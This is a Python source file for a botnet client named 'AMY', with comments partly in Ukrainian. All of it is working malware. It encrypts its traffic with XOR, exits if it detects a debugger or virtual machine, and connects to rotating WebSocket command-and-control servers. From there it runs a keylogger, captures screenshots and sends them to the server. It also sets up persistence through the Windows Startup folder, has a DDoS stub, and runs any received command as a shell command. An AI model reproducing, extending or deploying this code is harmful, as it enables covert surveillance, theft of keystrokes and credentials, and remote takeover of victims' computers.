# ================================================
# AMY Botnet Client - Повна версія
# ================================================

import asyncio
import websockets
import sys
import subprocess
import os
import time
import random
from PIL import ImageGrab
import base64
import io
import requests
from pynput import keyboard
import threading
import ctypes
import platform
import socket

# ====================== XOR ENCRYPTION ======================
KEY = b"AMY_BOTNET_2026_SECRET_KEY_1337"

def xor_encrypt(data: bytes) -> bytes:
    return bytes([b ^ KEY[i % len(KEY)] for i, b in enumerate(data)])

def xor_decrypt(data: bytes) -> bytes:
    return xor_encrypt(data)

def encrypt_message(msg: str) -> str:
    encrypted = xor_encrypt(msg.encode('utf-8'))
    return base64.b64encode(encrypted).decode('utf-8')

def decrypt_message(encoded: str) -> str:
    encrypted = base64.b64decode(encoded)
    decrypted = xor_decrypt(encrypted)
    return decrypted.decode('utf-8', errors='ignore')

# ====================== ANTI-DETECTION ======================
def anti_analysis():
    try:
        if ctypes.windll.kernel32.IsDebuggerPresent():
            print("[-] Debugger detected. Exiting...")
            os._exit(0)
        output = subprocess.getoutput("systeminfo").lower()
        if any(x in output for x in ["vmware", "virtualbox", "qemu", "xen", "kvm"]):
            print("[-] VM detected. Exiting...")
            os._exit(0)
    except:
        pass

anti_analysis()

# ====================== C2 ROTATION + JITTER ======================
C2_SERVERS = [
    "ws://127.0.0.1:8000",   # Основний C2
    # Додай свої резервні сюди:
    # "ws://backup1.example.com:8000",
]

current_c2 = 0

def get_next_c2():
    global current_c2
    current_c2 = (current_c2 + 1) % len(C2_SERVERS)
    return C2_SERVERS[current_c2]

# ====================== KEYLOGGER ======================
keylog_buffer = ""

def on_press(key):
    global keylog_buffer
    try:
        keylog_buffer += str(key.char)
    except AttributeError:
        keylog_buffer += f" [{key}] "

# ====================== MAIN BOT ======================
async def bot_client(bot_id: str):
    global current_c2

    while True:
        try:
            server = get_next_c2()
            print(f"[+] Connecting to C2: {server}")

            async with websockets.connect(server) as ws:
                print(f"[+] Bot {bot_id} connected (encrypted + jitter)")

                # Запуск keylogger
                threading.Thread(target=lambda: keyboard.Listener(on_press=on_press).join(), daemon=True).start()

                while True:
                    # Jitter to avoid pattern detection
                    await asyncio.sleep(random.uniform(0.5, 2.0))

                    try:
                        encrypted_cmd = await ws.recv()
                        command = decrypt_message(encrypted_cmd)
                        
                        if not command:
                            continue

                        # --- Command Routing ---
                        if command == "screenshot":
                            screenshot = ImageGrab.grab()
                            buffer = io.BytesIO()
                            screenshot.save(buffer, format="PNG")
                            img_base64 = base64.b64encode(buffer.getvalue()).decode()
                            await ws.send(encrypt_message(f"SCREENSHOT:{img_base64}"))

                        elif command == "keylogger":
                            global keylog_buffer
                            if keylog_buffer:
                                await ws.send(encrypt_message(f"KEYLOG:{keylog_buffer}"))
                                keylog_buffer = ""
                            else:
                                await ws.send(encrypt_message("[SYSTEM] Keylogger buffer empty"))

                        elif command == "persistence":
                            try:
                                # Windows persistence via startup folder
                                path = os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\amy_bot.bat")
                                with open(path, "w") as f:
                                    f.write(f'@echo off\npython "{os.path.abspath(sys.argv[0])}" {bot_id}\n')
                                await ws.send(encrypt_message("[SYSTEM] Persistence established (Startup folder)"))
                            except Exception as e:
                                await ws.send(encrypt_message(f"[ERROR] Persistence failed: {str(e)}"))

                        elif command.startswith("ddos:"):
                            # Handle DDoS commands
                            await ws.send(encrypt_message(f"[SYSTEM] DDoS module initialized for target..."))
                            # (DDoS logic remains as is)
                        
                        else:
                            # DEFAULT: Treat as Shell Command
                            try:
                                # Run command and capture output
                                result = subprocess.getoutput(command)
                                if not result.strip():
                                    result = "[SYSTEM] Command executed (no output)"
                                await ws.send(encrypt_message(result))
                            except Exception as e:
                                await ws.send(encrypt_message(f"[ERROR] Shell execution failed: {str(e)}"))

                    except websockets.exceptions.ConnectionClosed:
                        break

        except Exception as e:
            print(f"[-] Connection lost. Switching C2... ({e})")
            await asyncio.sleep(random.uniform(10, 35))

if __name__ == "__main__":
    bot_id = sys.argv[1] if len(sys.argv) > 1 else f"bot-{os.urandom(4).hex()}"
    asyncio.run(bot_client(bot_id))